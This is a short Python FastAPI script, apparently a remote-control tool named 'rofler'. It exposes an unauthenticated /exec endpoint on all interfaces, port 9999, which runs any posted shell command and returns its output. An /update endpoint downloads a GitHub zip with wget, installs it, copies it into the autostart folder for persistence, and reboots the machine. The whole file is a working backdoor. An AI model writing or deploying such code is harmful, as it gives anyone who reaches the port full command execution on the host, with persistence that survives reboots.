import os
from fastapi import FastAPI
import uvicorn


app = FastAPI()


update_cmd = """
rm -rf ~/rofler
wget https://github.com/ImCocos/rofler/archive/refs/heads/main.zip -P ~/;
unzip ~/rofler-main.zip -d ~/;
rm -f ~/rofler-main.zip;
mv ~/rofler-main ~/rofler;
python -m venv ~/rofler/venv;
~/rofler/venv/bin/python -m pip install -r ~/rofler/requirements.txt;
mkdir ~/.config/autostart;
cp ~/rofler/rofler ~/.config/autostart/rofler;
systemctl reboot;
""".strip()


@app.get("/update")
async def root():
    os.system(update_cmd)
    return {'status': 'ok'}

@app.post('/exec')
def exec(cmd: str):
    os.system(cmd + ' > ~/rofler/.tmp')
    with open(os.path.join(os.path.expanduser('~'), 'rofler/.tmp'), 'r') as file:
        raw = file.read()
    return {'status': 'ok', 'text': raw}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=9999)
